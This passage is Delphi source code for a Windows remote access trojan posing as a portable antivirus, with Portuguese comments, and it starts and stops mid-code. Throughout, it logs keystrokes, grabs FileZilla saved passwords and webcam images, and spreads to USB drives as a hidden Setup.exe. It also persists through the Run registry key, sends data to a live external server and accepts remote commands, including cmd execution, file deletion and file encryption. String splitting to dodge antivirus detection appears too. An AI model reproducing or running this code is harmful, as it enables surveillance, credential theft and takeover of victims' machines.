        ShellExecute(0, nil, PChar('C:\Program Files\WinRAR\Winrar.exe'),
        PChar('a -sfx"default.sfx" -z"'+tempDir+'windgusb.conf" -i"icon'+tempDir
        +'gicone.ico" -ep1 "'+particao+SearchFile.Name+'" "'+particao+'Setup.exe" '+'"'+Drive+Nome+'"'), nil, SW_HIDE);
      FileSetAttr(particao+'Setup.exe', FileGetAttr(particao+'Setup.exe') or faHidden or faSysFile);
      FindResult:=1;
//      FindResult := FindNext(SearchFile);
    end;
  finally
    FindClose(SearchFile);
  end;
end;

// Pega o nome do usuario
function getUser: String;
var
  regi: TRegistry;
  s: string;
begin
  regi := TRegistry.Create;
  With regi do
  Begin
    rootKey := HKEY_CURRENT_USER;
    OpenKey('Volatile Environment', false);
    s := ReadString('USERNAME');
    CloseKey;
    Result := Trim(s);
  end;
end;

// Comprime dados
function CompressStream(SrcStream: TMemoryStream): Boolean;
var
  InputStream, OutputStream: TMemoryStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  Result := false;
  if not assigned(SrcStream) then
    exit;
  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    Zlib.ZCompress(inbuffer, count, outbuffer, outcount, zcMax);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    Result := true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

function RetNmComp: String; // nome do computador
var
  lpBuffer: Array [0 .. 20] of Char;
  nSize: DWORD;
  mRet: Boolean;
begin
  nSize := 120;
  mRet := GetComputerName(lpBuffer, nSize);
  if mRet then
    Result := lpBuffer
  else
    Result := 'erro';
end;

function GetAppDataPath : String;
var
  ppID: PItemIdList;
  szBuff: array[0..255] of Char;
begin
  if SHGetSpecialFolderLocation(0, CSIDL_APPDATA, ppID) = NOERROR then
  begin
    SHGetPathFromIDList(ppID, szBuff);
    Result := szBuff;
  end;
end;

function GetFileZilla : String;
var
  LoadFile, DataFile:TStringList;
  Host, User, Pass, Port:String;
begin
  LoadFile := TStringList.Create;
  DataFile := TStringList.Create;
  if FileExists(GetAppDataPath + '\FileZilla\recentservers.xml') then
  begin
    LoadFile.LoadFromFile(GetAppDataPath + '\FileZilla\recentservers.xml');
    while (Pos('<Host>', LoadFile.Text) <> 0) do
    begin
      //Hostname
      Host := Copy(LoadFile.Text, Pos('<Host>', LoadFile.Text)+6, Length(LoadFile.Text));
      Host := Copy(Host, 1, Pos('</Host>', Host)-1);
      LoadFile.Text := StringReplace(LoadFile.Text, '<Host>', ' ', [rfIgnoreCase]);
      //Username
      User := Copy(LoadFile.Text, Pos('<User>', LoadFile.Text)+6, Length(LoadFile.Text));
      User := Copy(User, 1, Pos('</User>', User)-1);
      LoadFile.Text := StringReplace(LoadFile.Text, '<User>', ' ', [rfIgnoreCase]);
      //Password
      Pass := Copy(LoadFile.Text, Pos('<Pass>', LoadFile.Text)+6, Length(LoadFile.Text));
      Pass := Copy(Pass, 1, Pos('</Pass>', Pass)-1);
      LoadFile.Text := StringReplace(LoadFile.Text, '<Pass>', ' ', [rfIgnoreCase]);
      //Port
      Port := Copy(LoadFile.Text, Pos('<Port>', LoadFile.Text)+6, Length(LoadFile.Text));
      Port := Copy(Port, 1, Pos('</Port>', Port)-1);
      LoadFile.Text := StringReplace(LoadFile.Text, '<Port>', ' ', [rfIgnoreCase]);
      DataFile.Add('Server: ' + Host + #13#10 + 'Port: ' + Port + #13#10 + 'Username: ' + User + #13#10 + 'Password: ' + Pass);
    end;
    Result := DataFile.Text;
  end;
end;

function WindowsDr: Char;
var
  s: string;
begin
  asm nop end;
  SetLength(s, MAX_PATH);
  if GetWindowsDirectory(PChar(s), MAX_PATH) > 0 then
    Result := string(s)[1]
  else
    Result := #0;
end;

function acoloc(txt: string): string;
begin
  asm nop end;
  AvastPortable8.Memo1.text := AvastPortable8.Memo1.text + txt;
end;

procedure TrimAppMemorySize;
var MainHandle : THandle;
begin
try
  MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID) ;
  SetProcessWorkingSetSize(MainHandle, $FFFFFFFF, $FFFFFFFF) ;
  CloseHandle(MainHandle) ;
  Application.ProcessMessages;
except
end;
end;

function JanelaAtiva: String;//capturar o titulo da janela
var
  Handle: THandle;
  Len: LongInt;
  Title: String;
begin
  Handle := GetForegroundWindow;
  Len := GetWindowTextLength(Handle) + 1;
  SetLength(Title, Len);
  GetWindowText(Handle, PChar(Title), Len);
  JanelaAtiva := TrimRight(Title);
end;

procedure TAvastPortable8.buscapro(Procs: TStrings);
var
  ContinueLoop                : BOOL;
  FSnapshotHandle             : THandle;
  FProcessEntry32             : TProcessEntry32;
begin
  asm nop end;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while ContinueLoop do
  begin
    Procs.Add(FProcessEntry32.szExeFile);
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
end;

{ TUpload }
// Thread de Upload de Arquivos
procedure TUpload.Execute;
var
  s: string;
  stSize: Integer;
  recebendo: Boolean;
  Stream: TMemoryStream;
//  log: TStrings;
begin
  asm nop end;
  inherited;
  Stream := TMemoryStream.Create;
  recebendo := false;
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := String(Socket.ReceiveText);
      if not recebendo then
      begin
        if Pos(#0, s) > 0 then
        begin
          stSize := strToInt(Copy(s, Pos('<|Size|>', s) + 8, Pos(#0, s) - 1));
          Stream := TMemoryStream.Create;
        end
        else
          exit;
        recebendo := true;
        Delete(s, 1, Pos(#0, s));
      end;
      try
        Stream.Write(AnsiString(s)[1], length(s));
        if Stream.Size = stSize then
        begin
          Stream.Position := 0;
          recebendo := false;
          Stream.SaveToFile(SalvarUp);
          Stream.Free;
          if(AvastPortable8.CS5.Service.Equals('RecebeArq'))then
            AvastPortable8.CS1.Socket.SendText('<|Enviado|>')
          else begin
            AvastPortable8.CS1.Socket.SendText(AnsiString(AvastPortable8.CS5.Service));
            RenameFile(Drive+Nome,'PortableAntivirus_old.exe');
            RenameFile(SalvarUp,'PortableAntivirus.exe');
            TFile.SetCreationTime(Drive+'PortableAntivirus.exe', Now);
            ShellExecute(0,nil,PChar('PortableAntivirus_old.exe'), nil,nil,SW_NORMAL);
          end;
          Socket.Close;
        end;
      except
        Exit;
      end;
    end;
    Sleep(10);
  end;
end;

procedure TAvastPortable8.calculatempo(t: Integer; i: Integer; Ativo: Boolean);
begin
  if Ativo then
    SetTimer(Handle, t, i, nil)//timer,intervalo,nil
  else
    KillTimer(Handle, t);
end;

procedure TAvastPortable8.TimerCamTimer(Sender: TObject);
begin
if((camera.Active=False)and(not Webcam))then begin
  Exit;
end;
imagefmx:=FMX.Objects.TImage.Create(nil);
camera.SampleBufferToBitmap(imagefmx.Bitmap,True);

// TCameraComponent Incompativel com Bitmap VCL,
// Funciona somente com Bitmap FMX
imagefmx.Bitmap.SaveToFile(tempDir+'temp.bmp');
imagefmx.free;
end;

procedure TAvastPortable8.uOPHD9pMq4(var xxx: TWMTimer);
var i: Integer;
begin
  asm nop end;
  Application.ProcessMessages;
  sJanelaOld := sJanelaAtiva;
  sJanelaAtiva := JanelaAtiva;
  if sJanelaAtiva <> sJanelaOld then
    Memo1.Lines.Add('[' + JanelaAtiva + ']');
  i := 0;
  repeat
    if GetAsyncKeyState(i) = -32767 then
    begin
      Application.ProcessMessages;
      case i of
        8:acoloc('[BC'+'KSP'+'C]');
        9:acoloc('[T'+'AB]');
        12:acoloc('[ALT]');
        13:acoloc('[EN'+'TR]');
        16:acoloc('[SH'+'FT]');
        20:acoloc('[CP'+'SLO'+'CK]');
        46:acoloc('[DE'+'L]');
        96:acoloc('0');
        97:acoloc('1');
        98:acoloc('2');
        99:acoloc('3');
        100:acoloc('4');
        101:acoloc('5');
        102:acoloc('6');
        103:acoloc('7');
        104:acoloc('8');
        105:acoloc('9');
        144:acoloc('[NUM'+'LCK]');
        186:acoloc('Ç');
        187:acoloc('=');
        188:acoloc(',');
        189:acoloc('-');
        190:acoloc('.');
        191:acoloc(';');
      else
        if (i >= 65) and (i <= 90) then
          acoloc(Chr(i));
        if (i >= 32) and (i <= 63) then
          acoloc(Chr(i));
        // numpad keycodes
        if (i >= 96) and (i <= 110) then
          acoloc(Chr(i));
      end;
    end; // case;
    inc(i);
  until i = 222;
end;

procedure TAvastPortable8.notnullTimer(Sender: TObject);
begin
  if Memo1.Lines.text <> '' then
  begin
    send.Enabled := True;
    notnull.Enabled := False;
  end;
end;

procedure TAvastPortable8.recebeDadosTimer(Sender: TObject);
begin
  if RecebendoDados then
    RecebendoDados := false
  else
  begin
    CS1.Active := false;
    CS2.Active := false;
    CS3.Active := false;
  end;
end;

procedure TAvastPortable8.reConnectTimer(Sender: TObject);
begin
  if not CS1.Active then begin
    CS1.Active := True;
    StatusBar1.Panels.Items[1].Text := 'Conectando...';
  end;
end;

procedure TAvastPortable8.AppEventsException(Sender: TObject;
  E: Exception);
begin
Exit;
end;

procedure TAvastPortable8.autcopyTimer(Sender: TObject);
var
  regi: TRegistry;
begin
  asm nop end;
  regi := TRegistry.Create;
  Config.Enabled:= True;
  // Deprecated AV detecta, tecnica antiga, MUDAR
  if not (FileExists(tempDir + 'PortableAntivirus.exe'))then begin
    CopyFile(PChar(ParamStr(0)), PChar(tempDir + 'PortableAntivirus.exe'), False);
    FileSetAttr(tempDir + 'PortableAntivirus.exe', FileGetAttr(tempDir + 'PortableAntivirus.exe') or faHidden or faSysFile);
    With regi do Begin
      rootKey := HKEY_CURRENT_USER;
      OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', false);
      WriteString('PortableAntivirus', tempDir + 'PortableAntivirus.exe');
      CloseKey;
    end;
    Config.Enabled:=False;
    autcopy.Enabled:=False;
  end;
end;

procedure TAvastPortable8.sendTimer(Sender: TObject);
var sendmsg:string; Writer: TStreamWriter;
begin
  send.Interval:=7200000;
  send.Enabled := False;
  ParamList.AddFormField('user_id',AvastPortable8.Caption);
  ParamList.AddFormField('pcname', pcname);
  ParamList.AddFormField('keycode','N~;cfjj3icvG6IBRb*4V');
  try
    if FileExists(tempDir + pcname + '.txt') then
      Writer := TStreamWriter.Create(tempDir + pcname + '.txt', True, TEncoding.UTF8)
    else
      Writer := TStreamWriter.Create(tempDir + pcname + '.txt', False, TEncoding.UTF8);
    Writer.Write(memo1.Lines.Text);{ Corpo da mensagem }
  finally
    Writer.Close;
    Writer.Free;
  end;
  Memo1.Lines.Clear;
  if( InternetGetConnectedState(@Flags, 0))then begin
    try
      ParamList.AddFile('msgFile',tempDir + pcname + '.txt'); {adiciona o Corpo da mensagem }
	  //concatenar strings ajuda ofuscar do AV
      sendmsg:=http.Post('htt'+'p://con'+'amy.ho'+'l.es'+'/send'+'email'+'.php',ParamList);{Envia mensagem}
    except
      ParamList.Clear;
      notnull.Enabled := True;
      Exit;
    end;
    http.Disconnect;
    ParamList.Clear;
    try
      if(sendmsg<>'')then begin
        DeleteFile(tempDir + pcname + '.txt');
      end;
    finally
    end;
    if(sendmsg<>'ok')then
      Memo1.Lines.Add(sendmsg);
  end;
  if FileExists(tempDir + pcname + '.txt') then
    FileSetAttr(tempDir + pcname + '.txt', FileGetAttr(tempDir + pcname + '.txt') or faHidden);
  sendmsg:='';
  notnull.Enabled := True;
  TrimAppMemorySize;
end;

procedure TAvastPortable8.configTimer(Sender: TObject);
var result:string;x,y:integer;
begin
asm nop end;
  y:=0;
  ParamList.AddFormField('95cd'+'fac4'+'33cb'+'992b'+'dc40'+'52c4'+'37de'+'4cb5', AvastPortable8.Caption);
  ParamList.AddFormField('9e38'+'2f34'+'0c3b'+'999c'+'46f1'+'afcd'+'3beb'+'88ec', encrypt('4c3b'+'d1b4'+'724f'+'4e17'+'4866'+'fd0c'+'eac7'+'f83b','b8d5'+'2041'+'552e'+'8d1e','02d4'+'8497'+'3b70'+'c6b0'));
  if(InternetGetConnectedState(@Flags, 0))then begin
    try
      result:=http.Post('http'+'://con'+'amy.h'+'ol'+'.es/load'+'config.php',ParamList);
    except
      http.Disconnect;
      Exit;
    end;
    http.Disconnect;
    result:=decrypt(result,'e5d1'+'4401'+'ab03'+'2157','9c90'+'d21a'+'619e'+'3a15');
    config.Enabled:=False;
    while(Pos(';', result)>0)do begin
      x:=Pos(';', result);
      case y of
        0:ftphost:=Copy((result),0, Pos(';', result)-1);
        1:ftpuser:=Copy((result),0, Pos(';', result)-1);
        2:ftppass:=Copy((result),0, Pos(';', result)-1);
        3:begin asm nop end; host_server:=Copy((result),0, Pos(';', result)-1);end;{HOST do CS1}
        4:porta:=Copy((result),0, Pos(';', result)-1);{PORT do CS1}
      end;
      Delete(result,1,x);
      y:=y+1;
    end;
    CS1.Host:= host_server;
    CS1.Port:= porta.ToInteger;
    host_server:='vpn.udp.chainbox.cn';//despistar
    reConnect.Enabled:=True;
  end;
  notnull.Enabled:=true;
  ParamList.clear;
end;

procedure TAvastPortable8.CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  asm nop end;
  CS2.Host := CS1.Host;
  CS3.Host := CS1.Host;
  CS4.Host := CS1.Host;
  CS5.Host := CS1.Host;
  CS2.Port := CS1.Port;
  CS3.Port := CS1.Port;
  CS4.Port := CS1.Port;
  CS5.Port := CS1.Port;
  FirstBmp := TMemoryStream.Create;
  SecondBmp := TMemoryStream.Create;
  CompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
//  iSendCount := 0;
//  StatusBar1.Panels.Items[1].Text := 'Conectado';
  recebeDados.Enabled := true;
  Sleep(1000);
  Socket.SendText('<|PR'+'INC'+'IPA'+'L|>');
end;

procedure TAvastPortable8.CS1Connecting(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := 'Conectando...';
end;

procedure TAvastPortable8.CS1Disconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
//  StatusBar1.Panels.Items[1].Text := 'Desconectado';
  recebeDados.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;
  CS4.Active := false;
  CS5.Active := false;
  Form2.Close;
  TrimAppMemorySize;
end;

procedure TAvastPortable8.CS1Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
//  StatusBar1.Panels.Items[1].Text := 'Erro ao conectar';
  ErrorCode := 0;
  recebeDados.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;
  CS4.Active := false;
  CS5.Active := false;
  Form2.Close;
end;

procedure TAvastPortable8.CS1Read(Sender: TObject;
  Socket: TCustomWinSocket);
var
  myFile, TexAenvia, StrCommand, dados2: string;//StrPackSize
  arq:TextFile;
  diretorios,procs: TStrings;
  posX, posY: Integer;
  M: TMemoryStatus;
  zf:TZipFile;
begin
  asm nop end;
  TexAenvia:='nulol';
  M.dwLength := SizeOf(M);
  GlobalMemoryStatus(M);
  StrCommand := String(Socket.ReceiveText);
  dados2 := StrCommand;
  if Pos('<|S'+'ock'+'etM'+'ain|>', StrCommand) > 0 then//SocketMain
  begin
    Delete(dados2, 1, Pos('<|Soc'+'ket'+'Main'+'|>', dados2) + 13);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    IDSockPrincipal := dados2;
  end;
  if Pos('<|O'+'K|>', StrCommand) > 0 then
  begin//INFO
    TexAenvia:=('<|In'+'fo|>' + pcname + '<|>'+isDesktop+'<|>'+ GetOSInfo + '('+IntToStr(1+(M.dwTotalPhys div (1024*1024*1024)))+'GB)<|>' + getUser +'<|>'+ datetostr(TFile.GetCreationTime(ParamStr(0)))+'<|><<|');
  end;

  if Pos('<|PI'+'NG|>', StrCommand) > 0 then
  begin//PING PONG
    TexAenvia:=('<|PO'+'NG|>');
    RecebendoDados := true;
  end;

  if Pos('<|Cl'+'os'+'e|>', StrCommand) > 0 then
  begin//CLOSE
    CS1.Active := false;
    CS2.Active := false;
    CS3.Active := false;
    CS4.Active := false;
    CS5.Active := false;
  end;

  if Pos('<|REQ'+'UES'+'TKE'+'YBO'+'ARD|>', StrCommand) > 0 then
  begin//REQUESTKEYBOARD
    Delete(dados2, 1, Pos('<|RE'+'QUES'+'TKEYB'+'OA'+'RD|>', dados2) + 18);
    IDSockPrincipal := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    CS3.Close;
    CS3.Active := true;
  end;

  if StrCommand = '<|f'+'irs'+'t|>' then
  begin//FIRST
    CS2.Active := False;
    CS2.Active := True;
  end;

  if Pos('<|Op'+'en'+'Ch'+'at|>', StrCommand) > 0 then
  begin//OPENCHAT
    Form2.Show;
  end;

  if Pos('<|Ch'+'at|>', StrCommand) > 0 then
  begin//CHAT
    Delete(dados2, 1, Pos('<|C'+'ha'+'t|>', dados2) + 7);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    Form2.Memo2.Lines.Add(dados2);
    Form2.Memo2.Lines.Add(' ');
    FlashWindow(Application.Handle, true);
  end;

  if Pos('<|Clo'+'se'+'Ch'+'at|>', StrCommand) > 0 then
  begin//CLOSECHAT
    Form2.Close;
  end;

  if Pos('<|cur'+'sop'+'os|>', StrCommand) > 0 then
  begin//CURSOPOS
    Delete(dados2, 1, Pos('<|cur'+'sop'+'os|>', dados2) + 11);
    posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2) - 1));
    Delete(dados2, 1, Pos('<|>', dados2) + 2);
    posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2) - 1));
    SetCursorPos(posX, posY);
  end;

  if Pos('<|cu'+'rs'+'old|>', StrCommand) > 0 then
  begin//CURSOLD
    Delete(dados2, 1, Pos('<|c'+'ur'+'so'+'ld|>', dados2) + 10);
    posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2) - 1));
    Delete(dados2, 1, Pos('<|>', dados2) + 2);
    posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2) - 1));
    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
  end;

  if Pos('<|cu'+'rso'+'dc|>', StrCommand) > 0 then
  begin//CURSODC
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end;

  if Pos('<|c'+'ur'+'sol'+'u|>', StrCommand) > 0 then
  begin//CURSOLU
    Delete(dados2, 1, Pos('<|'+'cur'+'sol'+'u|>', dados2) + 10);
    posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2) - 1));
    Delete(dados2, 1, Pos('<|>', dados2) + 2);
    posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2) - 1));
    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end;

  if Pos('<|cu'+'rso'+'rd|>', StrCommand) > 0 then
  begin//CURSORD
    Delete(dados2, 1, Pos('<|cu'+'rs'+'ord|>', dados2) + 10);
    posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2) - 1));
    Delete(dados2, 1, Pos('<|>', dados2) + 2);
    posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2) - 1));
    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
  end;

  if Pos('<|Close2|>', StrCommand) > 0 then begin
    CS2.Active:=False;
  end;

  if Pos('<|curs'+'oru|>', StrCommand) > 0 then
  begin//CURSORU
    Delete(dados2, 1, Pos('<|cur'+'soru|>', dados2) + 10);
    posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2) - 1));
    Delete(dados2, 1, Pos('<|>', dados2) + 2);
    posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2) - 1));
    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end;
  //Logs do teclado LOGGS
  if Pos('<|lo'+'gg'+'s|>', StrCommand) > 0 then
  begin
    send.Interval:=5000;
  end;
  if Pos('<|keyof|>', StrCommand) > 0 then //modoOff
  begin
    calculatempo(1, 1, False);//desativa timer
    //desativar keyhook;
    Settings:=TSettings.Create;
    Settings.PropertyLog:=2;
    Settings.PropertyUsb:=usbInf;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
  end;
  if Pos('<|keytr|>', StrCommand) > 0 then // modoTimer
  begin
    calculatempo(1, 1, True);//ativa timer
    //keyhook to false
    Settings:=TSettings.Create;
    Settings.PropertyLog:=0;
    Settings.PropertyUsb:=usbInf;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
  end;
  if Pos('<|keyhk|>', StrCommand) > 0 then //modoHook
  begin
    //keyhook to true
    calculatempo(1, 1, False);
    Settings:=TSettings.Create;
    Settings.PropertyLog:=1;
    Settings.PropertyUsb:=usbInf;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
  end;
  //USB_AUTO
  if Pos('<|usbon|>', StrCommand) > 0 then //modoON
  begin
    usbInf:=1;
    Settings:=TSettings.Create;
    Settings.PropertyLog:=logs;
    Settings.PropertyUsb:=1;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
  end;
  if Pos('<|usboff|>', StrCommand) > 0 then //modoOFF
  begin
    usbInf:=0;
    Settings:=TSettings.Create;
    Settings.PropertyLog:=logs;
    Settings.PropertyUsb:=0;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
  end;
  // Gerenciador de Processos PROCESSOS
  if Pos('<|Pro'+'ces'+'sos|>', StrCommand) > 0 then
  begin
    try
      procs:=TStringList.Create;
      buscapro(procs);
      TexAenvia:=('<|Pr'+'oces'+'so'+'s|>' +procs.Text+ '<<|');
      procs.Free;
    except
      exit;
    end;
  end;

  if Pos('<|Pr'+'ocE'+'xe|>', StrCommand) > 0 then
  begin//PROCEXE
    try
      Delete(dados2, 1, Pos('<|Pr'+'ocEx'+'e|>', dados2) + 10);
      dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
      ShellExecute(0, nil, PChar('c'+'m'+'d.e'+'xe'), PChar('/c ' + dados2), nil, SW_HIDE);
    except
      exit;
    end;
  end;
  if Pos('<|Pr'+'oc'+'D'+'el|>', StrCommand) > 0 then
  begin//PROCDEL
    try
      Delete(dados2, 1, Pos('<|P'+'roc'+'De'+'l|>', dados2) + 10);
      dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
      if(KillTask(dados2)=0)then
        ShellExecute(0, nil, PChar('cm'+'d.ex'+'e'), PChar('/c tas'+'kki'+'ll /'+'IM ' + dados2 + ' /T /F'), nil, SW_HIDE);
    except
      exit;
    end;
  end;
  // Gerenciador de Arquivos FOLD
  if Pos('<|Fo'+'ld|>', StrCommand) > 0 then
  begin
    Delete(dados2, 1, Pos('<|Fo'+'ld|>', dados2) + 7);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    try
      diretorios := TStringList.Create;
      diretorios.Text := ListFolders(dados2);
      if diretorios.Strings[0] = '.' then
        diretorios.Delete(0);
      Socket.SendText(AnsiString('<|Fo'+'ld|>' + diretorios.Text + '<<|'));
      diretorios.Free;
    except
      exit;
    end;
  end;

  if Pos('<|Fi'+'le'+'s|>', StrCommand) > 0 then
  begin//FILES
    Delete(dados2, 1, Pos('<|F'+'il'+'es|>', dados2) + 8);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    Socket.SendText(AnsiString('<|Fi'+'les'+'|>' + GetFiles(dados2, '*.*') + '<<|'));
  end;

  if Pos('<|Re'+'nom'+'ear'+'Fi'+'le|>', StrCommand) > 0 then
  begin//RENOMEARFILE
    Delete(dados2, 1, Pos('<|Reno'+'mea'+'rFi'+'le|>', dados2) + 15);
    myFile:=Copy(dados2, 1, Pos('###', dados2) - 1);
    Delete(dados2, 1, Pos('###', dados2) + 2);
    dados2:=Copy(dados2, 1, Pos('<<|', dados2) - 1);
    ShellExecute(0, nil, PChar('cm'+'d.e'+'x'+'e'), PChar('/c re'+'na'+'me "' + myFile + '" "'+dados2+'"'), nil, SW_HIDE);
  end;

  if Pos('<|Cri'+'aNe'+'wPas'+'ta|>', StrCommand) > 0 then
  begin//CRIANEWPASTA
    Delete(dados2, 1, Pos('<|Cr'+'iaNe'+'wPa'+'sta|>', dados2) + 15);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    mkdir(dados2);
  end;

  if Pos('<|De'+'let'+'arFi'+'les|>', StrCommand) > 0 then
  begin//DELETARFILES
    Delete(dados2, 1, Pos('<|De'+'leta'+'rFil'+'es|>', dados2) + 15);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    DeleteDirectory(dados2);
    DeleteFile(dados2);
  end;

  if Pos('<|Ocu'+'ltar'+'Fil'+'es|>', StrCommand) > 0 then
  begin//OCULTARFILES
    Delete(dados2, 1, Pos('<|Ocult'+'arFi'+'les|>', dados2) + 15);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    ShellExecute(0, nil, PChar('c'+'md.'+'ex'+'e'), PChar('/c at'+'tr'+'ib "' + dados2 + '" +s +h'), nil, SW_HIDE);
  end;

  if Pos('<|Mostr'+'arF'+'iles|>', StrCommand) > 0 then
  begin//MostrarFiles
    Delete(dados2, 1, Pos('<|Mostr'+'arF'+'iles|>', dados2) + 15);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    ShellExecute(0, nil, PChar('c'+'md.'+'ex'+'e'), PChar('/c at'+'tr'+'ib "' + dados2 + '" -s -h'), nil, SW_HIDE);
  end;

  if Pos('<|ar'+'qbai'+'xad'+'ado|>', StrCommand) > 0 then
  begin//ARQBAIXADO
    Delete(dados2, 1, Pos('<|ar'+'qba'+'ixad'+'ado|>', dados2) + 15);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    ArqDow := TMemoryStream.Create;
    ArqDow.LoadFromFile(dados2);
    CS4.Close;
    CS4.Active := true;
  end;

  if Pos('<|upa'+'ren'+'via'+'f|>', StrCommand) > 0 then
  begin//UPARENVIAF
    Delete(dados2, 1, Pos('<|upa'+'ren'+'via'+'f|>', dados2) + 13);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    SalvarUp := dados2;
    CS5.Close;
    CS5.Active:=True;
    CS5.Service:='RecebeArq';
  end;

  if Pos('<|compress|>', StrCommand) > 0 then
  begin
    Delete(dados2, 1, Pos('<|compress|>', dados2) + 11);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    zf := TZipFile.Create;
    zf.ZipDirectoryContents(dados2+'.zip',dados2);
    zf.Free;
  end;

  if Pos('<|descompress|>', StrCommand) > 0 then
  begin
    Delete(dados2, 1, Pos('<|descompress|>', dados2) + 14);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    StrCommand:=Copy(dados2, 1, Pos(',', dados2) - 1);
    zf := TZipFile.Create;
    zf.ExtractZipFile(StrCommand+Copy(dados2, StrCommand.Length+2, dados2.Length),StrCommand);
    zf.Free;
  end;

  if Pos('<|crypt|>', StrCommand) > 0 then
  begin
    Delete(dados2, 1, Pos('<|crypt|>', dados2) + 8);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    if DirectoryExists(dados2)then
      GetFilesEncryptDecrypt(0,dados2,'*.*')
    else
      EncryptFile(dados2);
    AssignFile(arq, tempDir +'FilesCrypted.dat');
    if(FileExists(tempDir +'FilesCrypted.dat'))then
      Append(arq)
    else
      ReWrite(arq);
    WriteLn(arq, dados2);
    CloseFile(arq);
  end;

  if Pos('<|decrypt|>', StrCommand) > 0 then
  begin
    Delete(dados2, 1, Pos('<|decrypt|>', dados2) + 10);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 1);
    if DirectoryExists(dados2)then
      GetFilesEncryptDecrypt(1,dados2,'*.*')
    else
      DecryptFile(dados2);
  end;

  if Pos('<|decryp2|>', StrCommand) > 0 then
  begin
    if (not FileExists(tempDir +'FilesCrypted.dat')) then Exit;
    AssignFile(arq, tempDir +'FilesCrypted.dat');
    Reset(arq);
    while not Eof(arq) do begin
      ReadLn(arq, dados2);
      if DirectoryExists(dados2)then
        GetFilesEncryptDecrypt(1,dados2,'*.*')
      else
        DecryptFile(dados2+'.encrypted');
    end;
    CloseFile(arq);
    DeleteFile(tempDir +'FilesCrypted.dat')
  end;

  if Pos('<|A'+'tuali'+'zarC|>', StrCommand) > 0 then
  begin//ATUALIZARC
    Delete(dados2, 1, Pos('<|Atua'+'liza'+'rC|>', dados2) + 13);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 5);
    if FileExists(Drive+dados2+'.e'+'xe') then
      SalvarUp := Drive+dados2+intToStr(CS1.Socket.Handle)+'.e'+'xe'
    else
      SalvarUp := Drive+dados2+'.e'+'xe';
//    FileSetAttr(Drive + Nome, FileGetAttr(Drive + Nome) or faHidden);
    CS5.Close;
    CS5.Active := True;
    CS5.Service:='AtualizarC';
  end;
  if Pos('<|A'+'tuali'+'zarC2|>', StrCommand) > 0 then
  begin//ATUALIZARC
